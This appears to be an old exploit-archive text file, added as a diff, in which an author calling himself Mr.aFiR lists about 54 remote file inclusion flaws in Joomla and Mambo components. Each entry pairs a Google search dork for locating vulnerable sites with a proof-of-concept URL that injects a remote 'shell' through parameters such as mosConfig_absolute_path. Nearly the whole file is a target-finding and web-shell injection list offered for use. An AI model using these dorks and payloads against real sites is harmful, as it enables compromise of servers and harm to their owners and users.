@@ -1,0 +1,372 @@
+
+Joomla's RFI Summary
+
+#######################################################################\
+##                                _______   ____                   ##___\/\
+##          __ ___               / _____ \ /  __ \                 ##____ /\_________________
+##         /      \  _ _     ___ | |___ |/ | |  ) )                ##__  /(__~50_Joomla_X___()_   (>
+##        |  Y  Y  \| V_\   / _ Y|  __ |(_)| |_/ /      [A]        ##  \|(__By_Mr.aFiR____()()()   (>
+##        |__|__|__ \ |  ()| (_] | |  \|| ||  __ \                 ##__/|(__www.aFiR.me___()()()          (> 
+##                 \/_/     \___ | |    | || |  ) |                ##____\(_________________()       (>
+##                              \|/     |_/|_/  |/                 ##___  \/
+##                                                                 ##   /\/
+#######################################################################/
+# By The Name of ALLAH
+
+In this paper I will show you ~50 Joomla's RFI vulnerabilities ( D0rks & P0Cs )
+
+And maybe this week, if I'm free I'll make a php scanner 4 all these bugs ;)
+if you wanted it contact me after +3 days (until I finished it).
+
+0---------------------------------------------------------------------------------
+Google Dork:
+NULL(empty)
+
+P0C By Mr.aFiR:
+NULL(empty)
+1---------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_admin"
+
+P0C By Mr.aFiR:
+/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=shell
+2---------------------------------------------------------------------------------
+Google Dork:
+inurl:index.php?option=com_simpleboard
+
+P0C By Mr.aFiR:
+/components/com_simpleboard/file_upload.php?sbp=shell
+3---------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_hashcash"
+
+P0C By Mr.aFiR:
+/components/com_hashcash/server.php?mosConfig_absolute_path=shell
+4---------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_htmlarea3_xtd-c"
+
+P0C By Mr.aFiR
+/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=shell
+5---------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_sitemap"
+
+P0C By Mr.aFiR
+/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=shell
+6---------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_performs"
+
+P0C By Mr.aFiR:
+/components/com_performs/performs.php?mosConfig_absolute_path=shell
+7---------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_forum"
+
+P0C By Mr.aFiR:
+/components/com_forum/download.php?phpbb_root_path=
+8---------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_pccookbook"
+
+P0C By Mr.aFiR:
+/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=shell
+9---------------------------------------------------------------------------------
+Google Dork:
+inurl:index.php?option=com_extcalendar
+
+P0C By Mr.aFiR:
+/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=shell
+10--------------------------------------------------------------------------------
+Google Dork:
+inurl:"minibb"
+
+P0C By Mr.aFiR:
+/components/minibb/index.php?absolute_path=shell
+11--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_smf"
+
+P0C By Mr.aFiR:
+/components/com_smf/smf.php?mosConfig_absolute_path=
+P0C2 By Mr.aFiR:
+/modules/mod_calendar.php?absolute_path=shell
+12--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_pollxt"
+
+P0C By Mr.aFiR:
+/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=shell
+13--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_loudmounth"
+
+P0C By Mr.aFiR:
+/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=shell
+14--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_videodb"
+
+P0C By Mr.aFiR:
+/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=shel l
+15--------------------------------------------------------------------------------
+Google Dork:
+inurl:index.php?option=com_pcchess
+
+P0C By Mr.aFiR:
+/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=shell
+16--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_multibanners"
+
+P0C By Mr.aFiR:
+/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=sh ell
+17--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_a6mambohelpdesk"
+
+P0C By Mr.aFiR:
+/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=shel l
+18--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_colophon"
+
+P0C By Mr.aFiR:
+/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=shell
+19--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_mgm"
+
+P0C By Mr.aFiR:
+/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=shell
+20--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_mambatstaff"
+
+P0C By Mr.aFiR:
+/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=shell
+21--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_securityimages"
+
+P0C By Mr.aFiR:
+/components/com_securityimages/configinsert.php?mosConfig_absolute_path=shell
+
+P0C2 By Mr.aFiR:
+/components/com_securityimages/lang.php?mosConfig_absolute_path=shell
+22--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_artlinks"
+
+P0C By Mr.aFiR:
+/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=shell
+23--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_galleria"
+
+P0C By Mr.aFiR:
+/components/com_galleria/galleria.html.php?mosConfig_absolute_path=shell
+24--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_akocomment"
+
+P0C By Mr.aFiR:
+/akocomments.php?mosConfig_absolute_path=shell
+25--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_cropimage"
+
+P0C By Mr.aFiR:
+/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=shell
+26--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_kochsuite"
+
+P0C By Mr.aFiR:
+/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=shell
+27--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_comprofiler"
+
+P0C By Mr.aFiR:
+/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=shell
+28--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_zoom"
+
+P0C By Mr.aFiR:
+/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=shell
+
+P0C2 By Mr.aFiR:
+/components/com_zoom/includes/database.php?mosConfig_absolute_path=shell
+29--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_serverstat"
+
+P0C By Mr.aFiR:
+/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=she ll
+30--------------------------------------------------------------------------------
+Google Dork:
+inurl:"com_fm"
+
+P0C By Mr.aFiR:
+/components/com_fm/fm.install.php?lm_absolute_path=shell
+31--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_mambelfish
+
+P0C By Mr.aFiR:
+/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=shell
+32--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_lmo
+
+P0C By Mr.aFiR:
+/components/com_lmo/lmo.php?mosConfig_absolute_path=shell
+33--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_linkdirectory
+
+P0C By Mr.aFiR:
+/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_ path=shell
+34--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_mtree
+
+P0C By Mr.aFiR:
+/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_pat h=shell
+35--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_jim
+
+P0C By Mr.aFiR:
+/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=shell
+36--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_webring
+
+P0C By Mr.aFiR:
+/administrator/components/com_webring/admin.webring.docs.php?component_dir=shell
+37--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_remository
+
+P0C By Mr.aFiR:
+/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=
+38--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_babackup
+
+P0C By Mr.aFiR:
+/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=shell
+39--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_lurm_constructor
+
+P0C By Mr.aFiR:
+/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=shell
+40--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_mambowiki
+
+P0C By Mr.aFiR:
+/components/com_mambowiki/ MamboLogin.php?IP=shell
+41--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_a6mambocredits
+
+P0C By Mr.aFiR:
+/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=shell
+42--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_phpshop
+
+P0C By Mr.aFiR:
+/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=s hell
+43--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_cpg
+
+P0C By Mr.aFiR:
+/components/com_cpg/cpg.php?mosConfig_absolute_path=shell
+44--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_moodle
+
+P0C By Mr.aFiR:
+/components/com_moodle/moodle.php?mosConfig_absolute_path=shell
+45--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_extended_registration
+
+P0C By Mr.aFiR:
+/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_p ath=shell
+46--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_mospray
+
+P0C By Mr.aFiR:
+/components/com_mospray/scripts/admin.php?basedir=shell
+47--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_bayesiannaivefilter
+
+P0C By Mr.aFiR:
+/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=shell
+48--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_uhp
+
+P0C By Mr.aFiR:
+/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=shell
+49--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_peoplebook
+
+P0C By Mr.aFiR:
+/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=shell
+50--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_mmp
+
+P0C By Mr.aFiR:
+/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=shell
+51--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_reporter
+
+P0C By Mr.aFiR:
+/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=shell
+52--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_madeira
+
+P0C By Mr.aFiR:
+/components/com_madeira/img.php?url=shell
+53--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_jd-wiki
+
+P0C By Mr.aFiR:
+/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=shell
+54--------------------------------------------------------------------------------
+Google Dork:
+inurl:com_bsq_sitestats
+
+P0C By Mr.aFiR:
+/components/com_bsq_sitestats/external/rssfeed.php?baseDir=shell
+
+P0C2 By Mr.aFiR:
+/com_bsq_sitestats/external/rssfeed.php?baseDir=shell
+----------------------------------------------------------------------------------
+[!] Greetz to : Dr.Crypter / L0ve511 / Dr.B0B-HaCker / LL4SS / MyL0v3 / Hassan /
+                AbdelMano /  Eitch  /     Kém0o     / Girlz /  &' Me / ...
+##################################################################################
+#                          Author : Abdel aFiR (Mr.aFiR)                         #
+#                   Home : www.aFiR.me | q-_[at]hotmail[d0t]com                  #
+#                            "   I Missed You BaBe   "                           #
+##################################################################################
+                                                           \_[Made-in-Morocco]_/
+[#] A77X.Com - aFiR.me | O1-03-2010
+© Offensive Security 2011
